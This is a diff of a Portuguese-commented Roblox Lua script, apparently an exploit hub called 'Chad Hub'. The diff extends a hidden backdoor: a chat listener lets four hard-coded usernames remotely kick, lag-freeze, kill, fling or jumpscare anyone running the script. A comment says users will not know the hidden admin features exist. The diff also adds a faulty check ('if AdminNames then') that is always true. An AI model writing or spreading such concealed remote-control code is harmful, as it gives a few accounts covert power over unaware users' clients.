@@ -75,7 +75,8 @@ local TextChatService = game:GetService("TextChatService")
 local localPlayer = Players.LocalPlayer
 
 -- [[ CONTROLO DE ADMINISTRAÃ‡ÃƒO ]]
-local IS_ADMIN = (localPlayer.Name == "Bolsonaro_Jair7" or localPlayer.Name == "vl2445" or localPlayer.Name == "Sarah_Becca19")
+
+local AdminNames = {"Bolsonaro_Jair7", "vl2445", "Sarah_Becca19", "naruto35225"}
 local SpinPlayers = {}
 local CaixaPlayers = {}
 _G.KillLoopPlayers = {}
@@ -100,7 +101,7 @@ local Window = WindUI:CreateWindow({
 -- SÃ³ aparecem para Bolsonaro_Jair7. Outros usuÃ¡rios nem saberÃ£o que existem.
 -- =============================================================================
 
-if IS_ADMIN then
+if AdminNames then
     local VerifyTab = Window:Tab({
         Title = "Verificar",
         Icon = "user"
@@ -234,10 +235,27 @@ local function To(x, y, z, localName)
     end
 end
 
+
 TextChatService.MessageReceived:Connect(function(msg)
-    local text = msg.Text:lower()
+    -- 1. IDENTIFICAÇÃO REAL DE QUEM ENVIOU
+    local sender = game:GetService("Players"):GetPlayerByUserId(msg.TextSource.UserId)
+    if not sender then return end
     
-    -- 1. LÓGICA DE VERIFICAÇÃO
+    -- 2. VERIFICAÇÃO SE O REMETENTE É ADMIN
+    local isSenderAdmin = false
+    for _, adminName in pairs(AdminNames) do
+        if sender.Name == adminName then
+            isSenderAdmin = true
+            break
+        end
+    end
+    
+    -- Se não for um dos 3 admins, o script ignora totalmente
+    if not isSenderAdmin then return end
+
+    local text = msg.Text:lower()
+
+    -- 3. LÓGICA DE VERIFICAÇÃO (;verifique todos)
     if text == ";verifique todos" then
         task.spawn(function()
             task.wait(math.random(0.5, 1.5))
@@ -248,31 +266,30 @@ TextChatService.MessageReceived:Connect(function(msg)
         return 
     end
 
-    -- 2. CAPTURA DE COMANDOS COM ALVO
+    -- 4. CAPTURA DE COMANDOS COM ALVO (;comando alvo)
     local cmd, target = text:match("^;(.-)%s+([^%s]+)$")
     
+    -- Só executa se o alvo da mensagem for VOCÊ (o dono do script)
     if cmd and target and target == localPlayer.Name:lower() then
         local char = localPlayer.Character
         local hum = char and char:FindFirstChildOfClass("Humanoid")
         local hrp = char and char:FindFirstChild("HumanoidRootPart")
 
-        -- [[ NOVO: FUNÇÃO KICK ]]
+        -- [[ COMANDO: KICK ]]
         if cmd == "kick" then
             localPlayer:Kick("\n\nVocê Foi Expulso Por Chad Hub Admin\n")
 
-        -- [[ NOVO: FUNÇÃO LAG ]]
+        -- [[ COMANDO: LAG ]]
         elseif cmd == "lag" then
             task.spawn(function()
                 local t = tick()
-                while tick() - t < 10 do -- Trava por 10 segundos
-                    for i = 1, 1000000 do 
-                        -- Esse loop vazio pesado faz o FPS cair para 0
-                    end
+                while tick() - t < 10 do 
+                    for i = 1, 1000000 do end 
                     task.wait(0.01)
                 end
             end)
 
-        -- [[ FUNÇÃO: KILL LOOP ]]
+        -- [[ COMANDO: KILL LOOP ]]
         elseif cmd == "killloop" then
             _G.KillLoopPlayers[localPlayer.Name] = true
             task.spawn(function()
@@ -287,7 +304,7 @@ TextChatService.MessageReceived:Connect(function(msg)
         elseif cmd == "unkillloop" then
             _G.KillLoopPlayers[localPlayer.Name] = nil
 
-        -- [[ FUNÇÃO: JUMPSCARE ]]
+        -- [[ COMANDO: JUMPSCARE ]]
         elseif cmd == "jumpscare" then
             task.spawn(function()
                 local sg = Instance.new("ScreenGui", game:GetService("CoreGui"))
@@ -306,19 +323,13 @@ TextChatService.MessageReceived:Connect(function(msg)
                 sound:Destroy()
             end)
 
-        -- [[ MANTENDO RESTO DOS COMANDOS ]]
+        -- [[ COMANDOS EXTRAS ]]
         elseif cmd == "kill" then if hum then hum.Health = 0 end
         elseif cmd == "fling" then if hrp then hrp.Velocity = Vector3.new(0, 10000, 0) end
+        elseif cmd == "sit" then if hum then hum.Sit = true end
         elseif cmd == "frozen" then if hum then hum.PlatformStand = true end
         elseif cmd == "unfrozen" then if hum then hum.PlatformStand = false end
-        elseif cmd == "spin" then 
-            SpinPlayers[localPlayer.Name] = true
-            task.spawn(function()
-                while SpinPlayers[localPlayer.Name] and hrp do
-                    hrp.CFrame = hrp.CFrame * CFrame.Angles(0, math.rad(20), 0)
-                    task.wait()
-                end
-            end)
+        elseif cmd == "spin" then SpinPlayers[localPlayer.Name] = true
         elseif cmd == "unspin" then SpinPlayers[localPlayer.Name] = nil
         elseif cmd == "caixa" then 
             if hrp and not CaixaPlayers[localPlayer.Name] then
@@ -334,11 +345,9 @@ TextChatService.MessageReceived:Connect(function(msg)
             end
         elseif cmd == "uncaixa" then 
             if CaixaPlayers[localPlayer.Name] then CaixaPlayers[localPlayer.Name]:Destroy(); CaixaPlayers[localPlayer.Name] = nil end
-        elseif cmd == "sit" then if hum then hum.Sit = true end
         end
     end
 end)
-
 
 RunService.RenderStepped:Connect(function(dt)
     if SpinPlayers[localPlayer.Name] then
@@ -6003,6 +6012,7 @@ task.spawn(function()
         RE:WaitForChild("1RPNam1eColo1r", 9e9):FireServer("PickingRPBioColor", Color3.fromRGB(255, 19, 3))
     end)
 end)
+
 
 
 
